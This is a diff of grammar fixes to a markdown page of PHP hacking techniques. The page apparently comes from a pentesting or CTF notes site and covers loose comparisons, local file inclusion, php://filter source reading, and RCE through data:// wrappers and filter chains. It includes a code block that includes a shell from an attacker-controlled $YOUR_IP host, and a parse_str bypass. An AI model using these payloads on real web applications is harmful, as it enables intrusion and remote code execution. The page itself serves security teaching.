@@ -112,7 +112,7 @@ sha256: 34250003024812:0e4628903203806591613962103908588377341382099192070629969
 
 ### Comparison rules
 
-In PHP (< 8.0) the following table of rules apply when loosely comparing variables:
+In PHP (< 8.0) the following table of rules applies when loosely comparing variables:
 
 <figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>A table showing common loose comparisons with interesting values</p></figcaption></figure>
 
@@ -124,11 +124,11 @@ The `"php" == 0` case was so weird, that from PHP 8.0 onward, this is no longer 
 
 ## Local File Inclusion
 
-When some code uses the `include`, `include_once`, `require` or `require_once` keyword to include some file from user input (eg. `$_GET['page']`) you can include any file on the system using Directory Traversal.&#x20;
+When some code uses the `include`, `include_once`, `require` or `require_once` keyword to include a file from user input (eg. `$_GET['page']`) you can include any file on the system using Directory Traversal.&#x20;
 
-The include functions run PHP code in the files that are included. If you can upload any file, put PHP code in there and when you include it, it will be executed.&#x20;
+The functions run PHP code in the files that are included. If you can upload any file, put PHP code in there, and when you include it, it will be executed.&#x20;
 
-The PHP code being executed and not shown to you could be a problem, if you want to read source-code of the `.php` files. You can use the following PHP filter to convert the file to base64 before interpreting it:
+If the response is PHP code, it will be executed and not shown to you, which could be a problem. If you want to read source-code of the `.php` files, you can use the following PHP filter to convert the file to base64 before interpreting it:
 
 ```url
 php://filter/convert.base64-encode/resource=index.php
@@ -140,7 +140,7 @@ You can read PHP files like this even if `.php` is appended to your input in the
 
 ### RCE using PHP Filters
 
-The main goal for getting RCE from LFI is to get some arbitrary content returned by the URL, which is then included and read as PHP code. If you control the start of the URL in some include function, you can use [PHP Wrappers](https://www.php.net/manual/en/wrappers.php) to get content from other places than straight from a file. The `data://` wrapper for example can return arbitrary content for example, using the `base64` encoding:
+The main goal for getting RCE from LFI is to get some arbitrary content returned by the URL, which is then included and read as PHP code. If you control the start of the URL in some include function, you can use [PHP Wrappers](https://www.php.net/manual/en/wrappers.php) to get content from other places than straight from a file. The `data://` wrapper for example can return arbitrary content, for example, using the `base64` encoding:
 
 {% code title="PHP wrappers with a shell" %}
 ```url
@@ -149,7 +149,7 @@ http://$YOUR_IP/shell.php
 ```
 {% endcode %}
 
-However, in more recent versions of PHP, the `allow_url_include=` option which enables these some of these wrappers is **disabled by default**. There is a really powerful technique that I came across recently [found by loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) which combines lots of PHP filters to turn any file into arbitrary PHP code. For this you only need to have **control of the start** to allow PHP wrappers, and then have a valid file anywhere to transform into PHP code. But you'll have a valid file anyways from the default functionality of the site, so this is pretty much a guarantee.&#x20;
+However, in more recent versions of PHP, the `allow_url_include=` option which enables some of these wrappers is **disabled by default**. However, there is a really powerful technique that I came across recently [found by loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) which combines lots of PHP filters to turn any file into arbitrary PHP code. For this, you only need to have **control of the start** to allow PHP wrappers, and then have a valid file anywhere to transform into PHP code. But you'll have a valid file anyways from the default functionality of the site, so this is pretty much a guarantee.&#x20;
 
 {% code title="Example vulnerable code" %}
 ```php
@@ -267,7 +267,7 @@ Any interesting tricks that are PHP specific
 
 {% embed url="https://www.idontplaydarts.com/2013/06/http-parameter-pollution-with-cookies-in-php/" %}
 
-PHP turns `[` into `_` with the `parse_str` function. This can bypass checks looking for a name with an underscore. (Also works with cookies, which can even permanently overwrite cookie)
+PHP turns `[` into `_` with the `parse_str` function. This can bypass checks looking for a name with an underscore. (Also works with cookies, which can even permanently overwrite cookies)
 
 ```
 user_id=123&user[id=456
